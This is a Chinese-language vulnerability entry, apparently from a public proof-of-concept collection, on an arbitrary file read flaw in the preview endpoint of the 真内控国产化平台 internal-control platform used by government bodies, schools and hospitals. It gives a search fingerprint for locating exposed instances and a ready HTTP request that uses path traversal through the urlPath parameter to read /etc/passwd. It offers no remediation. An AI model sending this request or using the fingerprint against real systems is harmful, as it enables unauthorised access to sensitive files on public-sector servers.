---
source: "wy876 漏洞文库"
---

# 真内控国产化平台preview存在任意文件读取漏洞

# 一、漏洞简介
真内控国产化平台是基于国产可控技术开发的内部控制管理咨询及信息化服务平台。该平台涵盖了预算绩效、支出管理、采购管理、合同管理、资产管理、基建项目管理等多个模块，为公共部门（包括政府部门、科研机构、学校、医院等）提供全方位的经济活动内部控制解决方案。真内控国产化平台 preview接口存在一个任意文件读取漏洞，攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。通过利用此漏洞，攻击者可能获得系统内的敏感信息，导致潜在的信息泄露风险。

# 二、影响版本
真内控国产化平台

# 三、资产测绘
```plain
body="js/npm.echarts.js"
```


# 四、漏洞复现
```java
GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd  HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/um00s8xep779vpgx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
